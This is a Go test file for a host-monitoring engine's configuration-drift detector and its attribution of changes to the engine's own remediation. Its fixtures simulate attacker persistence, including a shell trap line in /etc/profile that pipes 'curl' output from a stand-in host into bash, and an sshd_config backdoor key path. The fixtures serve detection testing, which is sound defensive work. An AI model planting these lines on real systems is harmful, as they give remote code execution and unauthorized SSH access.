package l0

import (
	"bytes"
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"
)

// 公用内核（L0 确定性层/工作区/漂移检测）的测试：L0 快检、基线、
// 配置漂移、重基线归属。引擎协议（survey/deepdive/respond/收敛）
// 的测试在 autopilot 包。

func TestStateDrift(t *testing.T) {
	// 配置漂移检测：状态快照跨轮内容对比，变化产 config_drift 线索；
	// 首轮无基线只存快照；无变化不产；多条目变化合并为一条；线索带
	// 删除/新增行上下文。
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	e, err := newEngine(cfg, &fakeL0Remote{defaultOut: healthyOut}, &Env{HasSystemd: true, NProc: 8})
	if err != nil {
		t.Fatal(err)
	}
	// 首轮快照入库（基线）。
	pt1 := &BaselinePoint{At: time.Now(), State: map[string]map[string]string{
		"web-01": {"state_sshd": "line-a\nline-b\n", "state_ports": "p1\n"},
	}}
	if err := e.ws.AddBaseline(*pt1); err != nil {
		t.Fatal(err)
	}
	// 首轮对比（无基线）不产线索。
	if got := e.stateDrift(pt1, nil, false); len(got) != 0 {
		t.Fatalf("首轮不应有漂移: %+v", got)
	}
	// sshd 内容变化 → 一条 config_drift 线索（带删除/新增行）。
	pt2 := &BaselinePoint{At: time.Now(), State: map[string]map[string]string{
		"web-01": {"state_sshd": "line-a\nline-c\n", "state_ports": "p1\n"},
	}}
	got := e.stateDrift(pt2, nil, false)
	if len(got) != 1 || got[0].Signal != "config_drift" {
		t.Fatalf("变化应产 config_drift: %+v", got)
	}
	for _, want := range []string{"state_sshd", "line-b", "line-c"} {
		if !strings.Contains(got[0].Desc, want) {
			t.Errorf("描述应含 %q: %q", want, got[0].Desc)
		}
	}
	// 变化入库后，同状态再对比不产（对比基准已更新）。
	if err := e.ws.AddBaseline(*pt2); err != nil {
		t.Fatal(err)
	}
	if got := e.stateDrift(pt2, nil, false); len(got) != 0 {
		t.Errorf("无变化不应产线索: %+v", got)
	}
}

func TestWorkspace_L0RedetectCount(t *testing.T) {
	ws, err := NewWorkspace(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	if err := ws.AddFindings([]*Finding{NewFinding("web-01", "svc", "svc_failed", "d")}); err != nil {
		t.Fatal(err)
	}
	l0 := NewFinding("web-01", "svc", "svc_failed", "d2")
	l0.Source = SourceL0
	if err := ws.AddFindings([]*Finding{l0}); err != nil {
		t.Fatal(err)
	}
	if err := ws.AddFindings([]*Finding{l0}); err != nil {
		t.Fatal(err)
	}
	f := ws.Pending()[0]
	if f.Redetect != 2 {
		t.Fatalf("L0 重检出应计数 2 次: %+v", f)
	}
	// 模型裁决（Source 空）不计数。
	m := NewFinding("web-01", "svc", "svc_failed", "d3")
	if err := ws.AddFindings([]*Finding{m}); err != nil {
		t.Fatal(err)
	}
	if ws.Pending()[0].Redetect != 2 {
		t.Errorf("模型裁决不应计数: %+v", ws.Pending()[0])
	}
}

// TestMerge_L0RedetectPreservesModelEvidence L0 重检出不得清空模型已
// 写入的追查成果：pending 线索被 DeepDive 深化（根因/证据/置信度）后，
// 下一轮 L0 同 key 重检出只累计 Redetect——否则累积证据每轮被洗掉，
// 模型重复调查、报告证据消失（收敛受阻）。
func TestMerge_L0RedetectPreservesModelEvidence(t *testing.T) {
	ws, err := NewWorkspace(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	// 模型深化后的 pending：根因/证据/置信度已写入。
	deep := NewFinding("web-01", "svc", "svc_failed", "nginx 失败")
	deep.Source = SourceDeepDive
	deep.RootCause = "磁盘满"
	deep.Confidence = 0.9
	deep.Evidence = []string{"df -h: / 100%"}
	if err := ws.AddFindings([]*Finding{deep}); err != nil {
		t.Fatal(err)
	}
	// 下一轮 L0 重检出（同 key，发现层字段为空）。
	l0 := NewFinding("web-01", "svc", "svc_failed", "nginx 失败")
	l0.Source = SourceL0
	if err := ws.AddFindings([]*Finding{l0}); err != nil {
		t.Fatal(err)
	}
	f := ws.Pending()[0]
	if f.RootCause != "磁盘满" || f.Confidence != 0.9 || len(f.Evidence) != 1 {
		t.Fatalf("L0 重检出不应清空模型证据: %+v", f)
	}
	if f.Redetect != 1 {
		t.Fatalf("L0 重检出应计数 1 次: %+v", f)
	}
	// 模型再次深化（非 L0 来源）：非空字段更新仍生效；空字段不覆盖
	// 已有证据链——稀疏对象（只带 desc/root_cause）不得洗掉追查成果
	// （P1 修复语义：空值覆盖会让终裁/复扫的最小对象清空证据）。
	deep2 := NewFinding("web-01", "svc", "svc_failed", "nginx 已恢复")
	deep2.Source = SourceDeepDive
	deep2.RootCause = "磁盘满（已清理）"
	if err := ws.AddFindings([]*Finding{deep2}); err != nil {
		t.Fatal(err)
	}
	f = ws.Pending()[0]
	if f.RootCause != "磁盘满（已清理）" || len(f.Evidence) != 1 || f.Confidence != 0.9 {
		t.Fatalf("模型深化应更新非空字段并保留已有证据: %+v", f)
	}
}

// TestEngine_ConcurrentWarmupAndSnapshot 助手形态的默认并发：Warmup
// goroutine 与任务快检轮重叠时引擎状态字段（lastLeads/rebaseline/
// selfCommands/started）不得数据竞态（go test -race 验证）。
func TestEngine_ConcurrentWarmupAndSnapshot(t *testing.T) {
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	e, err := newEngine(cfg, &fakeL0Remote{defaultOut: healthyOut}, &Env{HasSystemd: true, NProc: 8})
	if err != nil {
		t.Fatal(err)
	}
	ctx := t.Context()
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		e.Warmup(ctx)
	}()
	go func() {
		defer wg.Done()
		e.RebaselineNext([]string{"echo warmup"})
		if _, err := e.SnapshotL0(ctx); err != nil {
			t.Errorf("SnapshotL0: %v", err)
		}
	}()
	wg.Wait()
	_ = e.LastLeads()
	_ = e.MarkStarted()
	_ = e.ws.StateSummary()
}

// TestLineDiff_ScaleGuard 规模护栏：超行数上限降级为整体变化粗报，
// 不跑 O(n·m) dp（海量短行会数十 GB 分配 OOM）。
func TestLineDiff_ScaleGuard(t *testing.T) {
	oldS := strings.Repeat("line\n", lineDiffMaxLines+100)
	newS := oldS + "extra\n"
	removed, added := lineDiff(oldS, newS)
	if len(removed) != 0 {
		t.Fatalf("超限应不计算删除行: %d", len(removed))
	}
	if len(added) == 0 || !strings.Contains(added[0], "超出") {
		t.Fatalf("超限应返回整体变化标记: %v", added)
	}
	// 正常规模仍精确：单行变化可定位。
	r, a := lineDiff("a\nb\n", "a\nc\n")
	if len(r) != 1 || r[0] != "b" || len(a) != 1 || a[0] != "c" {
		t.Fatalf("小规模应精确 diff: r=%v a=%v", r, a)
	}
}

// TestReport_L0FactsCoverage 报告含 L0 事实覆盖声明（人读可见）。
func TestReport_L0FactsCoverage(t *testing.T) {
	ws, err := NewWorkspace(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	ws.SetL0Facts(map[string]string{"web-01": "监听端口: 80,443；SUID: 3 个"})
	report := RenderReport(ws, time.Now().Add(-time.Minute))
	if !strings.Contains(report, "L0 事实覆盖") || !strings.Contains(report, "监听端口") {
		t.Fatalf("报告应含 L0 事实覆盖声明: %q", report)
	}
}

// TestDriftExplainedAttribution 重基线轮行级归属：新增行必须全文
// 出现在自身动作命令里（token 部分重叠不算——攻击者新增行与自身动作
// 仅 token 重叠不得豁免）；删除行与自身动作共享任一 token 即归属
// （sed 模式的 URL/配置行片段就是定位证据，R17 实测全 token 覆盖把
// 引擎自己的 URL 式删除误报为漂移）。
func TestDriftExplainedAttribution(t *testing.T) {
	if addedLineExplained("backup-sync", []string{"systemctl disable backup-check.timer; rm -f /etc/systemd/system/backup-check.timer"}) {
		t.Error("backup-sync 与 backup-check 仅 token 部分重叠，不得归属")
	}
	if !addedLineExplained("MaxSessions 50", []string{"echo 'MaxSessions 50' >> /etc/ssh/sshd_config"}) {
		t.Error("echo 追加的完整行应归属")
	}
	sshPath := []string{"/etc/ssh/sshd_config"}
	sedAK := "sed -i '/^AuthorizedKeysFile[[:space:]]*\\/tmp\\/.ak/d' /etc/ssh/sshd_config"
	if !removedLineExplained("AuthorizedKeysFile /tmp/.ak", sshPath, []string{sedAK}) {
		t.Error("sed 模式与删除行共享 token 应归属")
	}
	// R17 实测：URL 片段式 sed 模式（部分 token）必须归属——全 token
	// 覆盖要求把引擎自己的删除误报为漂移。
	trapLine := "trap 'curl -s http://updates.svc-check.example.com/pf | bash' DEBUG"
	sedTrap := "sed -i '/updates\\.svc-check\\.example\\.com\\/pf/d' /etc/profile"
	if !removedLineExplained(trapLine, []string{"/etc/profile", "/etc/bashrc"}, []string{sedTrap}) {
		t.Error("URL 片段式 sed 模式（部分 token）应归属")
	}
	if removedLineExplained("MaxSessions 10", sshPath, []string{"sed -i '/^ClientAliveCountMax[[:space:]]*0/d' /etc/ssh/sshd_config"}) {
		t.Error("sed 模式不含该行任何 token，不得归属（攻击者删除行）")
	}
	if !removedLineExplained("anything", sshPath, []string{"rm -f /etc/ssh/sshd_config"}) {
		t.Error("rm 整体删除应归属全部删除行")
	}
}

// TestLineDiffLCS LCS 行级 diff：多处间隔编辑只报真正增删的行——
// 前缀/后缀差在间隔编辑时把中间整段报为变更（R17 实测两处单行删除
// 报 85/83 行伪差，线索不可裁决）。
func TestLineDiffLCS(t *testing.T) {
	removed, added := lineDiff("a\nb\nc\nd\ne\nf\ng\nh\n", "a\nc\nd\ne\nf\nh\n")
	if len(removed) != 2 || removed[0] != "b" || removed[1] != "g" {
		t.Errorf("间隔两处删除应精确报 [b g]: %v", removed)
	}
	if len(added) != 0 {
		t.Errorf("应无新增: %v", added)
	}
	removed, added = lineDiff("", "deploy")
	if len(removed) != 0 || len(added) != 1 || added[0] != "deploy" {
		t.Errorf("空→内容应报新增 [deploy]: removed=%v added=%v", removed, added)
	}
	removed, added = lineDiff("x\ny\n", "x\ny\n")
	if len(removed) != 0 || len(added) != 0 {
		t.Errorf("无变化应空: removed=%v added=%v", removed, added)
	}
}

// TestEngine_L0StateEmptyProbeKeepsKey R15-R17 根因回归：空目录探针
// 输出为空串时键被缺省，首次真实变化被当"首轮无基线"跳过
// （state_sudoersd 三轮未产线）。空输出也要落键。
func TestEngine_L0StateEmptyProbeKeepsKey(t *testing.T) {
	env := &Env{HasSystemd: true, HasSS: true, NProc: 8}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	cmd := BuildMetricsCommand(env, Metrics(env))
	out1 := healthyOut + "\n__M_state_sudoersd__\n"
	out2 := healthyOut + "\n__M_state_sudoersd__\ndeploy\n"
	remote := &fakeL0Remote{defaultOut: svcFailedOut}
	remote.outputs = map[string][]string{cmd: {out1, out2}}
	e, err := newEngine(cfg, remote, env)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	e.l0Scan(ctx) // 空目录基线：键必须以空串存在
	var got *Finding
	for _, f := range e.l0Scan(ctx) {
		if f.Signal == "config_drift" {
			got = f
		}
	}
	if got == nil || got.Key != "state_sudoersd" {
		t.Fatalf("空基线后首次变化应产 config_drift(state_sudoersd): %+v", got)
	}
	if !strings.Contains(got.Desc, "deploy") {
		t.Errorf("线索应含新增行: %s", got.Desc)
	}
}

// TestEngine_L0StateDriftRealOrder 漂移检测真实调用顺序回归：
// AddBaseline 必须在对比之后（R12 实测：先行入库导致本轮快照自比，
// 漂移机制从未真实触发——state_sshd 摘要跨轮变化无线索；旧单测直接
// 调 stateDrift，未覆盖引擎真实调用顺序）。
func TestEngine_L0StateDriftRealOrder(t *testing.T) {
	env := &Env{HasSystemd: true, NProc: 8}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	cmd := BuildMetricsCommand(env, Metrics(env))
	out1 := healthyOut + "\n__M_state_sshd__\nline-a\nline-b\n"
	out2 := healthyOut + "\n__M_state_sshd__\nline-a\nline-c\n"
	remote := &fakeL0Remote{defaultOut: svcFailedOut}
	remote.outputs = map[string][]string{cmd: {out1, out2}}
	e, err := newEngine(cfg, remote, env)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	for _, f := range e.l0Scan(ctx) {
		if f.Signal == "config_drift" {
			t.Fatalf("首轮无基线不应产漂移: %+v", f)
		}
	}
	var got *Finding
	for _, f := range e.l0Scan(ctx) {
		if f.Signal == "config_drift" {
			got = f
		}
	}
	if got == nil || got.Key != "state_sshd" {
		t.Fatalf("内容跨轮变化应产 config_drift(state_sshd): %+v", got)
	}
	// 线索必须携带足以裁决的上下文（R13：裸"摘要变更"无法裁决）：
	// 采集命令 + 删除/新增行。
	for _, want := range []string{"state_sshd", "cat /etc/ssh/sshd_config", "line-b", "line-c"} {
		if !strings.Contains(got.Desc, want) {
			t.Errorf("漂移 desc 应含 %q: %s", want, got.Desc)
		}
	}
}

// TestEngine_L0RebaselineAfterRemediation 自身处置后的行级静默重基线：
// 变化行全部能被自身动作解释 → 不产漂移线索（R13 实测 state_ports 被
// 自身处置副作用触发）；后续攻击者的新变化照常产线。
func TestEngine_L0RebaselineAfterRemediation(t *testing.T) {
	env := &Env{HasSystemd: true, NProc: 8}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	cmd := BuildMetricsCommand(env, Metrics(env))
	out1 := healthyOut + "\n__M_state_sshd__\nAuthorizedKeysFile .ssh/authorized_keys\nAuthorizedKeysFile /tmp/.ak\n"
	// 自身 sed 删除 /tmp/.ak 行：变化行可归属自身动作 → 静默重基线。
	out2 := healthyOut + "\n__M_state_sshd__\nAuthorizedKeysFile .ssh/authorized_keys\n"
	// 攻击者新变化：追加 MaxAuthTries。
	out3 := healthyOut + "\n__M_state_sshd__\nAuthorizedKeysFile .ssh/authorized_keys\nMaxAuthTries 100\n"
	remote := &fakeL0Remote{defaultOut: svcFailedOut}
	remote.outputs = map[string][]string{cmd: {out1, out2, out3}}
	e, err := newEngine(cfg, remote, env)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	e.l0Scan(ctx) // 基线
	e.rebaseline = true
	e.selfCommands = []string{"sed -i '/^AuthorizedKeysFile[[:space:]]*\\/tmp\\/.ak/d' /etc/ssh/sshd_config"}
	for _, f := range e.l0Scan(ctx) { // 自身处置后：可归属 → 静默重基线
		if f.Signal == "config_drift" {
			t.Fatalf("可归属变化不应产漂移: %+v", f)
		}
	}
	if e.rebaseline || len(e.selfCommands) != 0 {
		t.Error("重基线标记与自身动作清单应在本轮清除")
	}
	var got *Finding
	for _, f := range e.l0Scan(ctx) { // 攻击者新变化：正常产线
		if f.Signal == "config_drift" {
			got = f
		}
	}
	if got == nil || got.Key != "state_sshd" {
		t.Fatalf("重基线后的新漂移应照常产线: %+v", got)
	}
	if !strings.Contains(got.Desc, "MaxAuthTries 100") {
		t.Errorf("漂移 desc 应含新增行: %s", got.Desc)
	}
}

// TestEngine_L0RebaselineAttackerInterleave R14 回归：攻击者变更与引擎
// 自身处置交错同一目标时，自身动作解释不了的新增行仍产漂移线索——
// 整轮跳过的摘要级豁免曾把攻击者追加行并入新基线永久吞掉（R14 实测
// MaxAuthTries 100 被吞，state_sshd 漂移第五次未验证）。
func TestEngine_L0RebaselineAttackerInterleave(t *testing.T) {
	env := &Env{HasSystemd: true, NProc: 8}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	cmd := BuildMetricsCommand(env, Metrics(env))
	// 基线（11:57）：攻击行 /tmp/.ak 尚在。
	out1 := healthyOut + "\n__M_state_sshd__\nAuthorizedKeysFile .ssh/authorized_keys\nAuthorizedKeysFile /tmp/.ak\n"
	// 11:59:44 攻击者追加 MaxAuthTries 100；12:00:16 引擎 sed 删除 .ak 行。
	// 12:00:24 L0（重基线轮）：现状 = 攻击者行 + 引擎删除的净效果。
	out2 := healthyOut + "\n__M_state_sshd__\nAuthorizedKeysFile .ssh/authorized_keys\nMaxAuthTries 100\n"
	remote := &fakeL0Remote{defaultOut: svcFailedOut}
	remote.outputs = map[string][]string{cmd: {out1, out2}}
	e, err := newEngine(cfg, remote, env)
	if err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	e.l0Scan(ctx) // 基线
	e.rebaseline = true
	e.selfCommands = []string{"sed -i '/^AuthorizedKeysFile[[:space:]]*\\/tmp\\/.ak/d' /etc/ssh/sshd_config"}
	var got *Finding
	for _, f := range e.l0Scan(ctx) { // 重基线轮
		if f.Signal == "config_drift" {
			got = f
		}
	}
	if got == nil || got.Key != "state_sshd" {
		t.Fatalf("自身动作解释不了的新增行应产漂移线索: %+v", e.ws.Pending())
	}
	for _, want := range []string{"MaxAuthTries 100", "本轮引擎自身动作", "sed -i"} {
		if !strings.Contains(got.Desc, want) {
			t.Errorf("漂移 desc 应含 %q（删除行可归属 + 新增行不可归属 + 自身动作清单）: %s", want, got.Desc)
		}
	}
}

func TestEngine_L0LogsPerHostErrors(t *testing.T) {
	// 远程主机采集失败（SSH 失联）：原因必须逐条进日志。
	remote := &fakeL0Remote{execErr: errors.New("ssh: connect refused")}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	e, err := newEngine(cfg, remote, &Env{HasSystemd: true, NProc: 8})
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	e.SetLogOut(&buf)
	// L0Round 走完整采集链（l0Scan 已弃用签名在外部不可见，用公开入口）。
	if leads := e.L0Round(context.Background()); len(leads) > 0 {
		t.Logf("失联不应产线索，实际: %+v", leads)
	}
	out := buf.String()
	if !strings.Contains(out, "L0 web-01 采集 collect 失败") || !strings.Contains(out, "ssh: connect refused") {
		t.Errorf("日志应包含主机采集失败原因:\n%s", out)
	}
}

func TestEngine_L0CollectSummaryLog(t *testing.T) {
	// 采集概况与线索明细逐条进日志：每台主机的数据可见性（指标/状态/
	// 安全事实/错误）与每条线索的 signal+对象键+现象——排查"没检出/误报"
	// 直接看日志，不用猜。
	remote := &fakeL0Remote{defaultOut: svcFailedOut}
	cfg := DefaultEngineConfig()
	cfg.Local = false
	cfg.Hosts = []string{"web-01"}
	cfg.WorkDir = t.TempDir()
	e, err := newEngine(cfg, remote, &Env{HasSystemd: true, NProc: 8})
	if err != nil {
		t.Fatal(err)
	}
	var buf bytes.Buffer
	e.SetLogOut(&buf)
	e.L0Round(context.Background())
	out := buf.String()
	for _, want := range []string{
		"L0 采集 web-01: 指标",      // 每台主机采集概况
		"错误 0 条",                // 错误计数可见
		"L0 线索 1 条：",            // 线索条数
		"- [web-01] svc_failed", // 明细：主机 + signal
	} {
		if !strings.Contains(out, want) {
			t.Errorf("日志应包含 %q:\n%s", want, out)
		}
	}
}
